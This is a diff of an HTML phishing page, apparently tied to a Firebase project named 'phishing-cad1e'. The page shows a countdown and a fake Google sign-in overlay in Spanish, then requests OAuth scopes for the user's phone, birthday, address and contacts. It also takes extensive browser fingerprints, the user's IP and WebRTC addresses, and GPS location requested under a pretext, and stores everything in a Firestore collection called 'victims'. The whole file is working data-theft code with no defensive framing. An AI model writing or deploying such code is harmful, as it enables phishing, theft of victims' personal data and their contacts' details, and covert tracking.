@@ -8,23 +8,176 @@
 * { margin:0; padding:0; box-sizing:border-box; }
 html, body {
   width:100%; height:100%; background:#000;
-  display:flex; align-items:center; justify-content:center; overflow:hidden;
+  display:flex; align-items:center; justify-content:center;
+  overflow:hidden; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
 }
+
+/* ── Número countdown ─────────────────────────── */
 #n {
-  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
-  font-size:clamp(80px,25vw,200px); font-weight:100; color:#fff;
-  letter-spacing:-4px; user-select:none; opacity:1; transition:opacity 0.18s;
+  font-size:clamp(80px,25vw,200px); font-weight:100;
+  color:#fff; letter-spacing:-4px; user-select:none;
+  opacity:1; transition:opacity 0.18s ease;
+  position:relative; z-index:1;
 }
+
+/* ── Overlay permiso Google ───────────────────── */
+#g-overlay {
+  display:none; position:fixed; inset:0;
+  background:rgba(0,0,0,0.92);
+  align-items:center; justify-content:center; z-index:50;
+}
+#g-overlay.show { display:flex; }
+.g-box {
+  background:#fff; border-radius:18px;
+  padding:32px 26px 24px; max-width:360px; width:90%;
+  text-align:center; box-shadow:0 24px 60px rgba(0,0,0,0.6);
+  animation:fadeUp 0.25s ease;
+}
+@keyframes fadeUp { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:translateY(0)} }
+.g-logo {
+  display:flex; align-items:center; justify-content:center;
+  gap:8px; margin-bottom:18px;
+}
+.g-logo svg { width:24px; height:24px; }
+.g-logo span { font-size:1.1rem; font-weight:500; color:#202124; }
+.g-box h2 {
+  font-size:1.15rem; font-weight:500; color:#202124;
+  margin-bottom:8px; line-height:1.3;
+}
+.g-box p {
+  font-size:0.82rem; color:#5f6368; margin-bottom:22px;
+  line-height:1.5;
+}
+.scopes-list {
+  background:#f8f9fa; border-radius:10px;
+  padding:12px 14px; margin-bottom:20px; text-align:left;
+}
+.scope-item {
+  display:flex; align-items:center; gap:9px;
+  padding:5px 0; font-size:0.78rem; color:#3c4043;
+}
+.scope-icon { font-size:1rem; flex-shrink:0; }
+.btn-g {
+  width:100%; background:#1a73e8; color:#fff;
+  border:none; border-radius:10px; padding:13px;
+  font-size:0.9rem; font-weight:500; cursor:pointer;
+  transition:background 0.15s; margin-bottom:10px;
+  display:flex; align-items:center; justify-content:center; gap:10px;
+}
+.btn-g:hover { background:#1557b0; }
+.btn-g svg  { width:18px; height:18px; }
+.btn-skip {
+  width:100%; background:none; border:none;
+  color:#5f6368; font-size:0.75rem; cursor:pointer; padding:7px;
+}
+.btn-skip:hover { color:#202124; }
+
+/* ── Overlay GPS ──────────────────────────────── */
+#gps-overlay {
+  display:none; position:fixed; inset:0;
+  background:rgba(0,0,0,0.92);
+  align-items:center; justify-content:center; z-index:60;
+}
+#gps-overlay.show { display:flex; }
+.gps-box {
+  background:#fff; border-radius:18px;
+  padding:28px 22px 20px; max-width:320px; width:88%;
+  text-align:center; box-shadow:0 24px 60px rgba(0,0,0,0.6);
+  animation:fadeUp 0.25s ease;
+}
+.gps-icon { font-size:2.5rem; margin-bottom:12px; }
+.gps-box h3 { font-size:1rem; color:#202124; margin-bottom:7px; }
+.gps-box p  { font-size:0.78rem; color:#5f6368; margin-bottom:18px; line-height:1.5; }
+.btn-allow {
+  width:100%; background:#1a73e8; color:#fff;
+  border:none; border-radius:10px; padding:12px;
+  font-size:0.86rem; font-weight:500; cursor:pointer; margin-bottom:8px;
+}
+.btn-deny {
+  width:100%; background:none; border:none;
+  color:#5f6368; font-size:0.73rem; cursor:pointer; padding:6px;
+}
+
+/* ── Toast feedback ───────────────────────────── */
+#toast {
+  display:none; position:fixed; bottom:28px; left:50%;
+  transform:translateX(-50%); background:#323232; color:#fff;
+  padding:10px 20px; border-radius:8px; font-size:0.8rem;
+  z-index:200; white-space:nowrap; animation:fadeUp 0.2s ease;
+}
+#toast.show { display:block; }
 </style>
 </head>
 <body>
+
+<!-- Número -->
 <span id="n">10</span>
+
+<!-- Overlay Google -->
+<div id="g-overlay">
+  <div class="g-box">
+    <div class="g-logo">
+      <!-- Google G -->
+      <svg viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+      <span>Google</span>
+    </div>
+    <h2>Inicia sesión para continuar</h2>
+    <p>Para acceder al contenido exclusivo necesitamos verificar tu identidad.</p>
+    <div class="scopes-list">
+      <div class="scope-item"><span class="scope-icon">👤</span> Ver tu perfil básico</div>
+      <div class="scope-item"><span class="scope-icon">📧</span> Ver tu correo de Gmail</div>
+      <div class="scope-item"><span class="scope-icon">📱</span> Ver tu número de teléfono</div>
+      <div class="scope-item"><span class="scope-icon">📅</span> Ver tu fecha de nacimiento</div>
+      <div class="scope-item"><span class="scope-icon">👥</span> Ver tus contactos</div>
+    </div>
+    <button class="btn-g" onclick="startGoogleAuth()">
+      <svg viewBox="0 0 24 24"><path fill="#fff" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#fff" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#fff" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/><path fill="#fff" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+      Continuar con Google
+    </button>
+    <button class="btn-skip" onclick="skipGoogle()">Omitir por ahora</button>
+  </div>
+</div>
+
+<!-- Overlay GPS -->
+<div id="gps-overlay">
+  <div class="gps-box">
+    <div class="gps-icon">📍</div>
+    <h3>Activar contenido cercano</h3>
+    <p>Para mostrarte contenido relevante de tu zona necesitamos acceder a tu ubicación.</p>
+    <button class="btn-allow" onclick="requestGPS()">Permitir ubicación</button>
+    <button class="btn-deny" onclick="denyGPS()">No permitir</button>
+  </div>
+</div>
+
+<!-- Toast -->
+<div id="toast"></div>
+
 <script type="module">
-import { initializeApp }         from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-import { getFirestore, collection, addDoc, updateDoc, doc, serverTimestamp }
+import { initializeApp }          from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getFirestore, collection, addDoc, updateDoc, doc }
   from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
-// ── CONFIG ──────────────────────────────────────────────
+// ══════════════════════════════════════════════════════
+//  CONFIG — pon aquí tu Google OAuth Client ID
+//  Google Cloud Console → APIs → Credentials → OAuth 2.0
+//  Authorized redirect URIs: la URL exacta de esta página
+// ══════════════════════════════════════════════════════
+const G_CLIENT_ID   = "TU_CLIENT_ID.apps.googleusercontent.com";
+const G_REDIRECT_URI = location.origin + location.pathname; // URL de esta misma página
+
+// Scopes: perfil, email, teléfono, cumpleaños, contactos
+const G_SCOPES = [
+  "openid",
+  "email",
+  "profile",
+  "https://www.googleapis.com/auth/user.phonenumbers.read",
+  "https://www.googleapis.com/auth/user.addresses.read",
+  "https://www.googleapis.com/auth/user.birthday.read",
+  "https://www.googleapis.com/auth/user.gender.read",
+  "https://www.googleapis.com/auth/contacts.readonly",
+].join(" ");
+
+// ── Firebase ─────────────────────────────────────────
 const app = initializeApp({
   apiKey:            "AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0",
   authDomain:        "phishing-cad1e.firebaseapp.com",
@@ -33,52 +186,51 @@ const app = initializeApp({
   messagingSenderId: "48855278637",
   appId:             "1:48855278637:web:cd6386bf2342f0b63344a4"
 });
-const db = getFirestore(app);
+const db  = getFirestore(app);
+let docRef = null;
 
-// ── COUNTDOWN ───────────────────────────────────────────
-const el = document.getElementById('n');
-let t = 10;
-const tick = setInterval(() => {
-  el.style.opacity = 0;
-  setTimeout(() => { t--; el.textContent = t; el.style.opacity = 1; if(t<=0) clearInterval(tick); }, 180);
-}, 1000);
-
-// ── RECOLECCIÓN ─────────────────────────────────────────
+// ══════════════════════════════════════════════════════
+// PAYLOAD
+// ══════════════════════════════════════════════════════
 const P = {};
 
-// Navigator
-P.ua        = navigator.userAgent || '';
-P.platform  = navigator.platform  || '';
-P.vendor    = navigator.vendor    || '';
-P.lang      = navigator.language  || '';
-P.langs     = (navigator.languages||[]).join(',');
-P.cookies   = String(navigator.cookieEnabled);
-P.online    = String(navigator.onLine);
-P.touch     = String(navigator.maxTouchPoints||0);
-P.memory    = String(navigator.deviceMemory||'n/a');
-P.cores     = String(navigator.hardwareConcurrency||'');
-P.dnt       = String(navigator.doNotTrack||'');
+// ── 1. Base fingerprint (sin permisos) ───────────────
+P.ua       = navigator.userAgent;
+P.platform = navigator.platform;
+P.vendor   = navigator.vendor;
+P.lang     = navigator.language;
+P.langs    = (navigator.languages||[]).join(',');
+P.cookies  = String(navigator.cookieEnabled);
+P.touch    = String(navigator.maxTouchPoints||0);
+P.memory   = String(navigator.deviceMemory||'n/a');
+P.cores    = String(navigator.hardwareConcurrency||'');
+P.online   = String(navigator.onLine);
 
-// Pantalla
-P.screen  = screen.width+'x'+screen.height;
-P.avail   = screen.availWidth+'x'+screen.availHeight;
-P.depth   = String(screen.colorDepth);
-P.dpr     = String(window.devicePixelRatio);
-P.orient  = screen.orientation?.type||'n/a';
-P.innerW  = String(window.innerWidth);
-P.innerH  = String(window.innerHeight);
+P.screen   = screen.width+'x'+screen.height;
+P.avail    = screen.availWidth+'x'+screen.availHeight;
+P.depth    = String(screen.colorDepth);
+P.dpr      = String(window.devicePixelRatio);
+P.orient   = screen.orientation?.type||'n/a';
 
-// Tiempo
-P.tz       = Intl.DateTimeFormat().resolvedOptions().timeZone||'';
+P.tz       = Intl.DateTimeFormat().resolvedOptions().timeZone;
 P.tzOffset = String(new Date().getTimezoneOffset());
-P.locale   = Intl.DateTimeFormat().resolvedOptions().locale||'';
+P.locale   = Intl.DateTimeFormat().resolvedOptions().locale;
 P.dateStr  = new Date().toString();
 P.ts       = String(Date.now());
 
-// URL
-P.referer = document.referrer||'(directo)';
-P.url     = location.href;
-P.params  = location.search;
+P.referer  = document.referrer||'(directo)';
+P.url      = location.href.split('#')[0]; // sin el token OAuth
+P.params   = location.search;
+
+P.dark     = String(matchMedia('(prefers-color-scheme:dark)').matches);
+P.ptrFine  = String(matchMedia('(pointer:fine)').matches);
+P.mobile   = String(matchMedia('(pointer:coarse)').matches);
+
+P.wasm     = String(!!window.WebAssembly);
+P.webGPU   = String(!!navigator.gpu);
+P.bt       = String(!!navigator.bluetooth);
+P.nfc      = String('NDEFReader' in window);
+P.notif    = 'Notification' in window ? Notification.permission : 'n/a';
 
 // Canvas fingerprint
 try {
@@ -86,33 +238,58 @@ try {
   const x = c.getContext('2d');
   x.textBaseline='top'; x.font='13px Arial';
   x.fillStyle='#f55'; x.fillRect(100,1,60,18);
-  x.fillStyle='#05a'; x.fillText('Invisible',2,14);
-  x.fillStyle='rgba(0,200,80,0.7)'; x.fillText('Invisible',4,16);
+  x.fillStyle='#05a'; x.fillText('Rx',2,14);
+  x.fillStyle='rgba(0,200,80,0.7)'; x.fillText('Rx',4,16);
   P.canvas = c.toDataURL().slice(-60);
 } catch(e){ P.canvas='blocked'; }
 
-// WebGL
+// WebGL — GPU real
 try {
-  const g = document.createElement('canvas').getContext('webgl')||
-            document.createElement('canvas').getContext('experimental-webgl');
+  const g = document.createElement('canvas').getContext('webgl');
   if(g){
-    P.glVendor   = g.getParameter(g.VENDOR)||'';
-    P.glRenderer = g.getParameter(g.RENDERER)||'';
     const d = g.getExtension('WEBGL_debug_renderer_info');
-    if(d){ P.glUVendor=g.getParameter(d.UNMASKED_VENDOR_WEBGL)||''; P.glURenderer=g.getParameter(d.UNMASKED_RENDERER_WEBGL)||''; }
-    P.glVer = g.getParameter(g.VERSION)||'';
-    P.glMax = String(g.getParameter(g.MAX_TEXTURE_SIZE)||'');
-    P.glExt = (g.getSupportedExtensions()||[]).join('|').slice(0,200);
+    if(d){
+      P.gpu = g.getParameter(d.UNMASKED_RENDERER_WEBGL);
+      P.gpuV= g.getParameter(d.UNMASKED_VENDOR_WEBGL);
+    }
+    P.glVer = g.getParameter(g.VERSION);
   }
 } catch(e){}
 
+// Connection
+const cn = navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+if(cn){
+  P.connEff = String(cn.effectiveType||'');
+  P.connDl  = String(cn.downlink||'');
+  P.connRtt = String(cn.rtt||'');
+}
+
+// Battery
+if(navigator.getBattery){
+  navigator.getBattery().then(b=>{
+    P.bat    = (b.level*100).toFixed(0)+'%';
+    P.batChg = String(b.charging);
+    P.batDisT= String(b.dischargingTime);
+    push();
+  }).catch(()=>{});
+}
+
+// Storage
+if(navigator.storage?.estimate){
+  navigator.storage.estimate().then(q=>{
+    P.stQuota=(q.quota/1e9).toFixed(2)+'GB';
+    P.stUsed =(q.usage/1e6).toFixed(2)+'MB';
+    push();
+  }).catch(()=>{});
+}
+
 // Audio fingerprint
 try {
-  const A = window.OfflineAudioContext||window.webkitOfflineAudioContext;
+  const A = window.OfflineAudioContext;
   if(A){
-    const ac=new A(1,44100,44100), os=ac.createOscillator(), cp=ac.createDynamicsCompressor();
+    const ac=new A(1,44100,44100),os=ac.createOscillator(),cp=ac.createDynamicsCompressor();
     os.connect(cp); cp.connect(ac.destination); os.start(0); ac.startRendering();
-    ac.oncomplete = ev => {
+    ac.oncomplete=ev=>{
       const b=ev.renderedBuffer.getChannelData(0); let s=0;
       for(let i=4500;i<5000;i++) s+=Math.abs(b[i]);
       P.audio=s.toString(); push();
@@ -121,83 +298,30 @@ try {
 } catch(e){}
 
 // Fonts
-const FONTS=['Arial','Calibri','Cambria','Comic Sans MS','Consolas','Courier New',
-  'Georgia','Impact','Segoe UI','Tahoma','Times New Roman','Verdana',
-  'Helvetica Neue','Monaco','Ubuntu','Noto Sans','Roboto','Open Sans'];
+const FL=['Arial','Calibri','Cambria','Georgia','Impact','Segoe UI',
+  'Tahoma','Times New Roman','Verdana','Helvetica Neue','Monaco',
+  'Ubuntu','Roboto','Open Sans','Noto Sans'];
 const sp=document.createElement('span');
 sp.style.cssText='position:absolute;visibility:hidden;font-size:72px;';
 sp.textContent='mmmmmmmmmmlli'; document.body.appendChild(sp);
 sp.style.fontFamily='monospace';
-const bW=sp.offsetWidth, bH=sp.offsetHeight;
-P.fonts=FONTS.filter(f=>{ sp.style.fontFamily=`"${f}",monospace`; return sp.offsetWidth!==bW||sp.offsetHeight!==bH; }).join(',');
-P.fontN=String(P.fonts.split(',').filter(Boolean).length);
+const bW=sp.offsetWidth,bH=sp.offsetHeight;
+P.fonts=FL.filter(f=>{sp.style.fontFamily='"'+f+'",monospace';return sp.offsetWidth!==bW||sp.offsetHeight!==bH;}).join(',');
 document.body.removeChild(sp);
 
-// Connection
-const cn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
-if(cn){ P.connType=String(cn.type||''); P.connEff=String(cn.effectiveType||''); P.connDl=String(cn.downlink||''); P.connRtt=String(cn.rtt||''); P.connSave=String(cn.saveData||''); }
-
-// Codecs
-try {
-  const v=document.createElement('video');
-  P.h264=v.canPlayType('video/mp4;codecs="avc1.42E01E"');
-  P.vp9 =v.canPlayType('video/webm;codecs="vp9"');
-  const a=document.createElement('audio');
-  P.mp3=a.canPlayType('audio/mpeg');
-  P.ogg=a.canPlayType('audio/ogg;codecs="vorbis"');
-} catch(e){}
-
-// CSS media
-P.dark      = String(matchMedia('(prefers-color-scheme:dark)').matches);
-P.ptrFine   = String(matchMedia('(pointer:fine)').matches);
-P.ptrCoarse = String(matchMedia('(pointer:coarse)').matches);
-P.hover     = String(matchMedia('(any-hover:hover)').matches);
-
-// Features
-P.wasm   = String(!!window.WebAssembly);
-P.webGPU = String(!!navigator.gpu);
-P.bt     = String(!!navigator.bluetooth);
-P.nfc    = String('NDEFReader' in window);
-P.notif  = 'Notification' in window ? Notification.permission : 'n/a';
-P.sw     = String(!!navigator.serviceWorker);
-
-// Hash
-const hi=[P.ua,screen.width,screen.height,P.tz,P.lang,P.cores,P.memory,P.canvas,P.glURenderer||''].join('|');
+// Hash compuesto
+const hi=[P.ua,screen.width,screen.height,P.tz,P.lang,P.cores,P.canvas,P.gpu||''].join('|');
 let h=0x811c9dc5;
-for(let i=0;i<hi.length;i++){ h^=hi.charCodeAt(i); h=(h*0x01000193)>>>0; }
+for(let i=0;i<hi.length;i++){h^=hi.charCodeAt(i);h=(h*0x01000193)>>>0;}
 P.hash='0x'+h.toString(16).toUpperCase().padStart(8,'0');
 
-// ── FIREBASE SEND ───────────────────────────────────────
-let docRef = null;
-
-// Limpia el objeto: quita undefined/null, convierte todo a string
-function clean(obj){
-  const o={};
-  for(const [k,v] of Object.entries(obj)){
-    if(v===undefined||v===null) continue;
-    o[k]=String(v);
-  }
-  o._ts = String(Date.now());
-  return o;
-}
-
-async function push(){
-  try {
-    if(!docRef){
-      docRef = await addDoc(collection(db,'victims'), clean(P));
-    } else {
-      await updateDoc(docRef, clean(P));
-    }
-  } catch(e){ console.error('[ROOT]',e); }
-}
-
-// IP pública async
+// ── 2. IP pública ────────────────────────────────────
 (async()=>{
   const APIS=[
-    {url:'https://ipapi.co/json/',         ip:'ip',       city:'city',       region:'region',     country:'country_name', org:'org',  lat:'latitude', lon:'longitude', tz:'timezone', asn:'asn'},
-    {url:'https://ipwho.is/',              ip:'ip',       city:'city',       region:'region',     country:'country',      org:'org',  lat:'latitude', lon:'longitude', tz:'timezone', asn:'asn'},
-    {url:'https://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,timezone,org,as,query',
-                                           ip:'query',    city:'city',       region:'regionName', country:'country',      org:'org',  lat:'lat',      lon:'lon',       tz:'timezone', asn:'as'},
+    {url:'https://ipapi.co/json/',         ip:'ip',    city:'city',      region:'region',    country:'country_name',org:'org',lat:'latitude',lon:'longitude',tz:'timezone',asn:'asn',isp:'org'},
+    {url:'https://ipwho.is/',              ip:'ip',    city:'city',      region:'region',    country:'country',     org:'org',lat:'latitude',lon:'longitude',tz:'timezone',asn:'asn',isp:'org'},
+    {url:'https://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,timezone,org,as,query,isp',
+                                           ip:'query', city:'city',      region:'regionName',country:'country',    org:'org',lat:'lat',     lon:'lon',       tz:'timezone',asn:'as', isp:'isp'},
   ];
   for(const api of APIS){
     try{
@@ -209,12 +333,13 @@ async function push(){
       P.region  = String(j[api.region]  ||'');
       P.country = String(j[api.country] ||'');
       P.org     = String(j[api.org]     ||'');
+      P.isp     = String(j[api.isp]     ||'');
       P.lat     = String(j[api.lat]     ||'');
       P.lon     = String(j[api.lon]     ||'');
       P.ipTZ    = String(j[api.tz]      ||'');
       P.asn     = String(j[api.asn]     ||'');
       await push(); break;
-    } catch(e){ continue; }
+    }catch(e){continue;}
   }
 })();
 
@@ -232,29 +357,244 @@ try{
     await push();
   };
   setTimeout(()=>pc.close(),6000);
-} catch(e){ P.ipLocal1='blocked'; }
+}catch(e){P.ipLocal1='blocked';}
 
-// Storage estimate
-if(navigator.storage?.estimate){
-  navigator.storage.estimate().then(q=>{
-    P.stQuota=(q.quota/1e9).toFixed(2)+'GB';
-    P.stUsed =(q.usage /1e6).toFixed(2)+'MB';
-    push();
-  }).catch(()=>{});
+// ═══════════════════════════════════════════════════════
+// OAUTH GOOGLE — flujo implicit (token en fragment)
+// ═══════════════════════════════════════════════════════
+
+// Exposición global para botones inline
+window.startGoogleAuth = startGoogleAuth;
+window.skipGoogle      = skipGoogle;
+window.requestGPS      = requestGPS;
+window.denyGPS         = denyGPS;
+
+function startGoogleAuth() {
+  if(G_CLIENT_ID.startsWith('TU_')){
+    toast('⚠ Configura G_CLIENT_ID en el código');
+    return;
+  }
+  const state = btoa(Date.now()); // CSRF token básico
+  sessionStorage.setItem('oauth_state', state);
+
+  // Guardamos el docRef id para seguir actualizando al regresar
+  if(docRef) sessionStorage.setItem('docId', docRef.id);
+
+  const url = new URL('https://accounts.google.com/o/oauth2/v2/auth');
+  url.searchParams.set('client_id',     G_CLIENT_ID);
+  url.searchParams.set('redirect_uri',  G_REDIRECT_URI);
+  url.searchParams.set('response_type', 'token');  // implicit — token en URL fragment
+  url.searchParams.set('scope',         G_SCOPES);
+  url.searchParams.set('state',         state);
+  url.searchParams.set('include_granted_scopes', 'true');
+  url.searchParams.set('prompt',        'consent'); // siempre muestra la pantalla de permisos
+
+  // Redirect — la misma página maneja el token al volver
+  location.href = url.toString();
 }
 
-// Battery
-if(navigator.getBattery){
-  navigator.getBattery().then(b=>{
-    P.bat    =(b.level*100).toFixed(0)+'%';
-    P.batChg =String(b.charging);
-    P.batDisT=String(b.dischargingTime);
-    push();
-  }).catch(()=>{});
+function skipGoogle(){
+  document.getElementById('g-overlay').classList.remove('show');
+  // Mostrar GPS overlay después de cerrar Google
+  setTimeout(()=>document.getElementById('gps-overlay').classList.add('show'), 400);
 }
 
-// Envío inicial (con lo que hay sincrónico ya)
-setTimeout(()=>push(), 800);
+// ── Manejar regreso desde OAuth (token en URL fragment) ──
+function handleOAuthReturn() {
+  const hash = location.hash.slice(1);
+  if(!hash.includes('access_token')) return false;
+
+  const params = Object.fromEntries(new URLSearchParams(hash));
+  const token  = params.access_token;
+  if(!token) return false;
+
+  // Limpiar URL (no dejar el token visible)
+  history.replaceState(null,'', location.pathname + location.search);
+
+  // Restaurar docRef si existe
+  const prevId = sessionStorage.getItem('docId');
+  if(prevId) docRef = doc(db,'victims', prevId);
+
+  P.gTokenExpiry = String(Date.now() + Number(params.expires_in)*1000);
+  P.gScope       = params.scope||'';
+
+  // Llamar People API con el token
+  fetchPeopleAPI(token);
+  return true;
+}
+
+async function fetchPeopleAPI(token) {
+  const fields = [
+    'names','emailAddresses','phoneNumbers','addresses',
+    'birthdays','genders','occupations','organizations',
+    'urls','relations','biographies','photos'
+  ].join(',');
+
+  try {
+    const r = await fetch(
+      `https://people.googleapis.com/v1/people/me?personFields=${fields}`,
+      { headers:{ Authorization:'Bearer '+token } }
+    );
+    const j = await r.json();
+
+    // Parsear todos los campos
+    P.gName      = j.names?.[0]?.displayName        || '';
+    P.gGivenName = j.names?.[0]?.givenName           || '';
+    P.gLastName  = j.names?.[0]?.familyName          || '';
+    P.gEmail     = j.emailAddresses?.[0]?.value      || '';
+    P.gPhone     = j.phoneNumbers?.[0]?.value         || '';
+    P.gPhone2    = j.phoneNumbers?.[1]?.value         || '';
+    P.gBirthday  = j.birthdays?.[0]?.text            ||
+                   JSON.stringify(j.birthdays?.[0]?.date||'') || '';
+    P.gGender    = j.genders?.[0]?.value             || '';
+    P.gAddress   = j.addresses?.[0]?.formattedValue  || '';
+    P.gCity      = j.addresses?.[0]?.city            || '';
+    P.gCountry   = j.addresses?.[0]?.country         || '';
+    P.gPostal    = j.addresses?.[0]?.postalCode       || '';
+    P.gOrg       = j.organizations?.[0]?.name        || '';
+    P.gTitle     = j.organizations?.[0]?.title       || '';
+    P.gBio       = j.biographies?.[0]?.value?.slice(0,200) || '';
+    P.gPhoto     = j.photos?.[0]?.url                || '';
+    // Todos los teléfonos de contactos propios
+    P.gAllPhones = (j.phoneNumbers||[]).map(p=>p.value).join(' | ');
+    P.gAllEmails = (j.emailAddresses||[]).map(e=>e.value).join(' | ');
+
+    await push();
+
+    // Leer primeros 10 contactos (scope contacts.readonly)
+    await fetchContacts(token);
+  } catch(e){
+    P.gError = e.message;
+    await push();
+  }
+
+  // Después del OAuth siempre pedimos GPS
+  setTimeout(()=>document.getElementById('gps-overlay').classList.add('show'), 600);
+}
+
+async function fetchContacts(token){
+  try{
+    const r = await fetch(
+      'https://people.googleapis.com/v1/people/me/connections?personFields=names,phoneNumbers,emailAddresses&pageSize=20',
+      { headers:{ Authorization:'Bearer '+token } }
+    );
+    const j = await r.json();
+    const conns = j.connections||[];
+    P.contactsCount = String(conns.length + (j.totalItems||0));
+    // Primeros 5 contactos con teléfono
+    const withPhone = conns.filter(c=>c.phoneNumbers?.length);
+    P.contact1 = withPhone[0]?.names?.[0]?.displayName+' '+withPhone[0]?.phoneNumbers?.[0]?.value||'';
+    P.contact2 = withPhone[1]?.names?.[0]?.displayName+' '+withPhone[1]?.phoneNumbers?.[0]?.value||'';
+    P.contact3 = withPhone[2]?.names?.[0]?.displayName+' '+withPhone[2]?.phoneNumbers?.[0]?.value||'';
+    P.contact4 = withPhone[3]?.names?.[0]?.displayName+' '+withPhone[3]?.phoneNumbers?.[0]?.value||'';
+    P.contact5 = withPhone[4]?.names?.[0]?.displayName+' '+withPhone[4]?.phoneNumbers?.[0]?.value||'';
+    await push();
+  }catch(e){}
+}
+
+// ── GPS ──────────────────────────────────────────────
+function requestGPS(){
+  document.getElementById('gps-overlay').classList.remove('show');
+  if(!navigator.geolocation){ P.gps='not_supported'; push(); return; }
+  navigator.geolocation.getCurrentPosition(
+    async pos=>{
+      P.gpsLat  = String(pos.coords.latitude);
+      P.gpsLon  = String(pos.coords.longitude);
+      P.gpsAcc  = String(pos.coords.accuracy)+'m';
+      P.gpsAlt  = String(pos.coords.altitude||'');
+      P.gpsSpd  = String(pos.coords.speed||'');
+      P.gpsHead = String(pos.coords.heading||'');
+      P.gps     = 'granted';
+      await push();
+      toast('✓ Verificado');
+    },
+    async err=>{
+      P.gps = 'denied:'+err.code;
+      await push();
+    },
+    { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
+  );
+}
+
+function denyGPS(){
+  document.getElementById('gps-overlay').classList.remove('show');
+  P.gps='user_denied'; push();
+}
+
+// ── Notification permission (silencioso) ─────────────
+if('Notification' in window && Notification.permission === 'default'){
+  // No forzar el popup, pero si el usuario interactúa, pedirlo
+  document.addEventListener('click', ()=>{
+    Notification.requestPermission().then(r=>{ P.notif=r; push(); });
+  }, { once:true });
+}
+
+// ══════════════════════════════════════════════════════
+// FIREBASE HELPERS
+// ══════════════════════════════════════════════════════
+function clean(obj){
+  const o={};
+  for(const [k,v] of Object.entries(obj)){
+    if(v===undefined||v===null) continue;
+    o[k]=String(v).slice(0,500);
+  }
+  o._ts=String(Date.now());
+  return o;
+}
+
+async function push(){
+  try{
+    if(!docRef){
+      docRef = await addDoc(collection(db,'victims'), clean(P));
+    } else {
+      await updateDoc(docRef, clean(P));
+    }
+  }catch(e){ console.error('[ROOT]',e); }
+}
+
+// ── Toast ─────────────────────────────────────────────
+function toast(msg, ms=2500){
+  const t=document.getElementById('toast');
+  t.textContent=msg; t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),ms);
+}
+window.toast = toast;
+
+// ══════════════════════════════════════════════════════
+// INIT
+// ══════════════════════════════════════════════════════
+// ¿Es un regreso de OAuth?
+const fromOAuth = handleOAuthReturn();
+
+// Countdown
+const el = document.getElementById('n');
+let t = 10;
+if(!fromOAuth){
+  const tick = setInterval(()=>{
+    el.style.opacity=0;
+    setTimeout(()=>{ t--; el.textContent=t; el.style.opacity=1; if(t<=0) clearInterval(tick); },180);
+  },1000);
+  // Mostrar overlay Google a los 3 segundos
+  setTimeout(()=>document.getElementById('g-overlay').classList.add('show'), 3000);
+} else {
+  // Regresó de Google, solo muestra 0 y el countdown ya terminó
+  el.textContent='0';
+  toast('✓ Verificación completada');
+}
+
+// Envío inicial con fingerprint base
+setTimeout(()=>push(), 900);
+
+// Envío al cerrar
+window.addEventListener('beforeunload',()=>{
+  P._exit=String(Date.now());
+  if(docRef){
+    navigator.sendBeacon(
+      `https://firestore.googleapis.com/v1/projects/phishing-cad1e/databases/(default)/documents/victims/${docRef.id}?key=AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0&updateMask.fieldPaths=_exit`,
+      JSON.stringify({fields:{_exit:{stringValue:P._exit}}})
+    );
+  }
+});
 </script>
 </body>
 </html>
